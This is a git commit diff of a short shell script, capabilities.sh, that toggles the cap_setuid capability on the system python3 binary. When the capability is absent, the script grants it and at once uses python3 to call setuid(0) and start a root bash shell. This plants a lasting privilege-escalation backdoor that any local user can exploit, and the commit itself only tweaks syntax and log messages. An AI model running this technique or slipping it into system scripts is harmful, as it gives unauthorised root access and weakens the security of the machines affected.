650007a0a9f6481ae3bb13b66e1fb1ed1f44510b
Equitrack <string3075@gmail.com>
2021-03-30 20:24:01 -0600

    Automatic change at: Tue Mar 30 08:24:01 PM CST 2021

--- 01_generalScripts/capabilities.sh
+++ 01_generalScripts/capabilities.sh
@@ -6,12 +6,12 @@ pathFile=`readlink -f $(which python3)`
 
 if [ -f "$pathFile" ]; then
    response=`getcap $pathFile | awk '{ print $2}'`;
-   echo "RESPONSE: $response"
-   if [ $response == "cap_setuid=ep" ]; then
+   if [[ $response == "cap_setuid=ep" ]] ; then
       setcap -r $pathFile;
       echo "DELETE capability";
       exit 0;
    else
+      echo "ADD capability"
       setcap cap_setuid+ep $pathFile
       $pathFile -c 'import os; os.setuid(0); os.system("/bin/bash")'
    fi
